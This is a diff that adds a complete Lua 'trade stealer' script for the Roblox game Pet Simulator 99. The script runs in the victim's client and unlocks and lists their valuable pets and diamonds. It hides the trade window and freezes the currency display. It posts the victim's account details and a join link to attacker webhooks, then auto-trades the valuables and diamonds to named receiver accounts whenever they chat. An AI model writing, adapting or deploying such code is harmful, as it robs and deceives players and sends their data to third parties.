@@ -1,0 +1,516 @@
+function PS99_STEALER()
+	min_rap = 1
+	version = "0.2.0"
+
+	repeat
+		task.wait()
+	until game:IsLoaded()
+
+	repeat
+		task.wait()
+	until game.PlaceId ~= nil
+
+	repeat
+		task.wait()
+	until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
+
+	repeat
+		task.wait()
+	until game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+
+	local Library = require(game.ReplicatedStorage.Library)
+
+	repeat
+		task.wait()
+		loaded = Library.IsLoaded()
+	until loaded
+
+	local Inventory = require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory
+	local _ = game.Players.LocalPlayer
+
+	game:GetService("ReplicatedStorage"):WaitForChild("Network")
+
+	local HttpService = game:GetService("HttpService")
+	local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+
+	setreadonly(Network, false)
+
+	local function u6()
+		local v34 = require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()
+
+		if not v34 then
+			return nil
+		end
+
+		return v34._id
+	end
+	local function u7()
+		return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._counter
+	end
+	local function u8(p1)
+		local t1 = {
+			[1] = game:GetService("Players"):WaitForChild(p1)
+		}
+
+		Network.Invoke("Server: Trading: Request", unpack(t1))
+	end
+	local function u9()
+		local t2 = {
+			[1] = u6(),
+			[2] = true,
+			[3] = u7()
+		}
+
+		repeat
+			task.wait(0.1)
+			Network.Invoke("Server: Trading: Set Ready", unpack(t2))
+			response2 = Network.Invoke("Server: Trading: Set Confirmed", unpack(t2))
+		until u6() == nil
+	end
+	local function u10(p2, p3)
+		local RAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
+
+		return ({
+			Class = {
+				Name = p2
+			},
+			IsA = function(_, p5)
+				return p5 == p2
+			end,
+			GetId = function(_)
+				return p3.id
+			end,
+			StackKey = function(_)
+				return HttpService:JSONEncode({
+					id = p3.id,
+					pt = p3.pt,
+					sh = p3.sh,
+					tn = p3.tn
+				})
+			end,
+			AbstractGetRAP = function(p8)
+				if not RAPCmds or type(RAPCmds.Get) ~= "function" then
+					return nil
+				end
+
+				local ok, result = pcall(RAPCmds.Get, p8)
+
+				if not ok then
+					return nil
+				end
+
+				return result
+			end
+		}):AbstractGetRAP() or 0
+	end
+
+	function GetInventory()
+		local Inventory2 = require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory
+		local t3 = {}
+
+		gargantuanCount = 0
+		titanicCount = 0
+		hugeCount = 0
+		otherValuableItems = 0
+
+		for _, v in pairs({
+			"Pet",
+			"Egg",
+			"Charm",
+			"Enchant",
+			"Potion",
+			"Misc",
+			"Hoverboard",
+			"Booth",
+			"Ultimate"
+		}) do
+			if Inventory2[v] ~= nil then
+				for k, v2 in pairs(Inventory2[v]) do
+					if v ~= "Pet" then
+						local v76 = u10(v, v2)
+
+						if v76 >= min_rap then
+							otherValuableItems = otherValuableItems + 1
+
+							local v77 = v2.id .. " (x" .. (v2._am and tostring(v2._am) or "1") .. ")"
+
+							table.insert(t3, {
+								category = v,
+								uid = k,
+								amount = v2._am or 1,
+								rap = v76,
+								name = v77
+							})
+						end
+					else
+						local v78 = require(game.ReplicatedStorage.Library.Directory).Pets[v2.id]
+
+						if v78.huge or v78.exclusiveLevel or v78.titanic or v78.gargantuan then
+							if not v78.titanic then
+								if not v78.huge then
+									if v78.gargantuan then
+										gargantuanCount = gargantuanCount + 1
+									end
+								else
+									hugeCount = hugeCount + 1
+								end
+							else
+								titanicCount = titanicCount + 1
+							end
+
+							local v79 = u10(v, v2)
+
+							if v79 >= min_rap then
+								local s1 = ""
+
+								if not v2.pt or v2.pt ~= 1 then
+									if v2.pt and v2.pt == 2 then
+										s1 = "Rainbow "
+									end
+								else
+									s1 = "Golden "
+								end
+
+								if v2.sh then
+									s1 = "Shiny " .. s1
+								end
+
+								local v81 = s1 .. v2.id .. " (x" .. (v2._am and tostring(v2._am) or "1") .. ")"
+
+								table.insert(t3, {
+									category = v,
+									uid = k,
+									amount = v2._am or 1,
+									rap = v79,
+									name = v81
+								})
+							end
+						end
+					end
+
+					if v2._lk then
+						local t4 = {
+							[1] = k,
+							[2] = false
+						}
+
+						Network.Invoke("Locking_SetLocked", unpack(t4))
+					end
+				end
+			end
+		end
+
+		table.sort(t3, function(p9, p10)
+			return p9.rap * p9.amount > p10.rap * p10.amount
+		end)
+
+		return t3
+	end
+
+	toSendList = GetInventory()
+
+	local function u11(p11, p12, p13)
+		local t5 = {
+			[1] = u6(),
+			[2] = p11,
+			[3] = p12,
+			[4] = p13 or 1
+		}
+
+		start_time = tick()
+
+		repeat
+			task.wait(0.1)
+		until Network.Invoke("Server: Trading: Set Item", unpack(t5)) == true or tick() - start_time > 5
+	end
+	local function u12(p14)
+		local v43 = math.floor(p14)
+		local n1 = 1
+
+		while v43 >= 1000 do
+			v43 = v43 / 1000
+			n1 = n1 + 1
+		end
+
+		return string.format("%.2f%s", v43, ({
+			"",
+			"k",
+			"m",
+			"b",
+			"t"
+		})[n1])
+	end
+
+	game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.Visible = false
+	game.Players.LocalPlayer.PlayerGui.MainMobile.MobileCurrency.Visible = false
+
+	local CurrentCamera = game.Workspace.CurrentCamera
+
+	CurrentCamera.FieldOfView = 70
+	CurrentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+		CurrentCamera.FieldOfView = 70
+	end)
+
+	local MainLeft = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft
+	local LeftPosition = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Position
+
+	MainLeft:GetPropertyChangedSignal("Enabled"):Connect(function()
+		MainLeft.Enabled = true
+		MainLeft.Left.Position = LeftPosition
+	end)
+
+	local Main = game:GetService("Players").LocalPlayer.PlayerGui.Main
+	local BottomButtonsPosition = game:GetService("Players").LocalPlayer.PlayerGui.Main.BottomButtons.Position
+
+	Main:GetPropertyChangedSignal("Enabled"):Connect(function()
+		Main.Enabled = true
+		Main.BottomButtons.Position = BottomButtonsPosition
+	end)
+
+	local GoalsSide = game:GetService("Players").LocalPlayer.PlayerGui.GoalsSide
+	local FramePosition = game:GetService("Players").LocalPlayer.PlayerGui.GoalsSide.Frame.Position
+
+	GoalsSide:GetPropertyChangedSignal("Enabled"):Connect(function()
+		GoalsSide.Enabled = true
+		GoalsSide.Frame.Position = FramePosition
+	end)
+
+	local PlayerGuiMessage = game:GetService("Players").LocalPlayer.PlayerGui.Message
+
+	PlayerGuiMessage:GetPropertyChangedSignal("Enabled"):Connect(function()
+		PlayerGuiMessage.Enabled = false
+	end)
+
+	local Amount = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+
+	gems_amount_text = Amount.Text
+	Amount:GetPropertyChangedSignal("Text"):Connect(function()
+		Amount.Text = gems_amount_text
+	end)
+	game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"].Disabled = true
+
+	local n2 = 1
+
+	local function u23()
+		for k, v in pairs(Inventory.Currency) do
+			if v.id == "Diamonds" then
+				local _am = v._am
+
+				n2 = _am
+
+				local t6 = {
+					[1] = u6(),
+					[2] = "Currency",
+					[3] = k,
+					[4] = _am
+				}
+
+				start_time = tick()
+
+				while Network.Invoke("Server: Trading: Set Item", unpack(t6)) ~= true and not (tick() - start_time > 5) do
+				end
+			end
+		end
+	end
+	local function u24()
+		inv = toSendList
+		c = 0
+		s = table.concat({
+			"Gargantuans : " .. tostring(gargantuanCount),
+			"Titanics : " .. tostring(titanicCount),
+			"Huges    : " .. tostring(hugeCount),
+			"Other    : " .. tostring(otherValuableItems)
+		}, "\n") .. "\n\n"
+
+		for _, v in pairs(inv) do
+			c = c + 1
+			RAP = v.rap * v.amount
+			s = s .. v.name .. " x" .. " : " .. u12(RAP) .. " RAP\n"
+
+			if c == 10 then
+				return s
+			end
+		end
+
+		return s
+	end
+
+	TOTALRAP = 0
+
+	for _, v in pairs(toSendList) do
+		TOTALRAP = TOTALRAP + v.rap * v.amount
+	end
+
+	if not (TOTALRAP > 100000000) then
+		PING = "\n"
+	else
+		PING = "--@everyone\n"
+		Webhook = BigHitsWebhook
+	end
+
+	if titanicCount > 0 or gargantuanCount > 0 then
+		Webhook = DualhookWebhook
+	end
+
+	_MSG = PING .. "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")";
+	(function(p15, p16, p17)
+		ExecutorWebhook = identifyexecutor() or "undefined"
+		fardplayer = game.Players.LocalPlayer
+
+		local t7 = {
+			["Content-Type"] = "application/json"
+		}
+		local t8 = {
+			content = p16,
+			username = game.Players.LocalPlayer.Name,
+			embeds = {{
+				title = "PS99 TRADE-STEALER (auto joiner has it already dw)",
+				description = "",
+				color = tonumber(13697227),
+				fields = {
+					{
+						name = "X Scripts Reborn Execution Log.",
+						value = "```Username     : " .. fardplayer.Name .. "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge .. " Days" .. "\nExploit      : " .. ExecutorWebhook .. "\nReceivers     : " .. table.concat(WebhookUsernames, ", ") .. "\nVersion      : " .. version .. "```",
+						inline = false
+					},
+					{
+						name = "🪐 __/__ **`Total RAP:`**",
+						value = "```" .. u12(p17) .. "```",
+						inline = false
+					},
+					{
+						name = "🪐 __/__ **`Items:`**",
+						value = "```" .. table.concat({
+							"Gargantuans : " .. tostring(gargantuanCount),
+							"Titanics : " .. tostring(titanicCount),
+							"Huges    : " .. tostring(hugeCount),
+							"Other    : " .. tostring(otherValuableItems)
+						}, "\n") .. "```",
+						inline = false
+					},
+					{
+						name = "Click To Join",
+						value = ROBLOX_JOIN_CLICK_URL,
+						inline = false
+					}
+				}
+			}}
+		}
+
+		content_noping = p16:gsub(PING, "")
+
+		local json = HttpService:JSONEncode(t8)
+
+		request({
+			Url = p15,
+			Method = "POST",
+			Headers = t7,
+			Body = json
+		})
+		content_noping = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
+		logdata = t8
+		logdata.content = content_noping
+		request({
+			Url = ActualLogsWebhook,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = game:GetService("HttpService"):JSONEncode(logdata)
+		})
+		newdata = {
+			game_name = "Pet Simulator 99",
+			total_value = u12(p17),
+			items_list = u24(),
+			inventory_link = "PS99 Stealer Does Not Have Pastebin Link Support",
+			country = get_country_emoji(),
+			game_emoji = ":dog:"
+		}
+		obf = Encoding.Encode(newdata)
+		print(#obf, obf)
+		newnewdata = {
+			content = obf
+		}
+		request({
+			Url = LogsWebhook,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = game:GetService("HttpService"):JSONEncode(newnewdata)
+		})
+	end)(Webhook, _MSG, TOTALRAP)
+
+	function STEAL(p18)
+		while true do
+			wait(0.1)
+
+			if game:GetService("Players"):WaitForChild(p18) ~= nil then
+				u8(p18)
+			end
+
+			if u6() ~= nil then
+				INV = GetInventory()
+				biggest_rap = 0
+
+				for _, v in pairs(INV) do
+					if v.rap * v.amount > biggest_rap then
+						biggest_rap = v.rap * v.amount
+					end
+				end
+
+				c = 0
+
+				for _, v in pairs(INV) do
+					current_rap = v.rap * v.amount
+
+					if current_rap < biggest_rap * 0.2 then
+						break
+					end
+
+					c = c + 1
+
+					if c > 30 then
+						break
+					end
+
+					u11(v.category, v.uid, v.amount)
+				end
+
+				u23()
+				u9()
+			end
+		end
+	end
+	function shall_steal(p19)
+		for _, v in pairs(Usernames) do
+			if v:lower() == p19.Name:lower() then
+				return true
+			end
+		end
+
+		if not string.find(p19.Name:lower(), "egorhits_") then
+			return false
+		end
+
+		return true
+	end
+
+	for _, player in pairs(game.Players:GetPlayers()) do
+		if shall_steal(player) then
+			player.Chatted:Connect(function()
+				STEAL(player.Name)
+			end)
+		end
+	end
+
+	game.Players.PlayerAdded:Connect(function(player)
+		if shall_steal(player) then
+			player.Chatted:Connect(function()
+				STEAL(player.Name)
+			end)
+		end
+	end)
+end
+
+PS99_STEALER()
